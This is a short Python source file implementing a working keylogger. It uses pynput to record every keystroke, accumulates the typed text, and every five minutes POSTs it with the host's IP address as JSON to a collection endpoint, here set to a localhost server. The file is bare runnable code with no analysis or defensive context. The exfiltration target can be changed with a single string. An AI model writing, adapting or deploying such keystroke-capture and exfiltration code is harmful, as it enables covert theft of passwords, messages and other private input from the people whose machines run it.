
import json
import threading
from pynput import keyboard
import urllib3
import socket
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

text = ""

ip_address = "127.0.0.1"
port_number = "8080"

time_interval = 300
http = urllib3.PoolManager()
def reset():
    global text
    text = ""
def send_post_req():
   
    try:

        payload = json.dumps({ "text":text, "ip": IPAddr}).encode('utf-8')

        r = http.request('POST',"http://127.0.0.1:8000/user/",body=payload, headers={'Content-Type': 'application/json'} )

        timer = threading.Timer(time_interval, send_post_req)
   
        
        
        timer.start()
        print(text)
        print(payload)
    except:
        print("Couldn't complete request!")

    reset()
   
   
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        pass
    elif key == keyboard.Key.tab:
        pass
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift_r:
        pass
    elif key == keyboard.Key.shift_l:
        pass
    elif key == keyboard.Key.alt:
        pass
    elif key == keyboard.Key.ctrl:
        pass
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.cmd:
        pass
    elif key == keyboard.Key.caps_lock:
        pass
    elif key == keyboard.Key.right:
        pass
    elif key == keyboard.Key.left:
        pass
    elif key == keyboard.Key.down:
        pass
    elif key == keyboard.Key.up:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
 


  


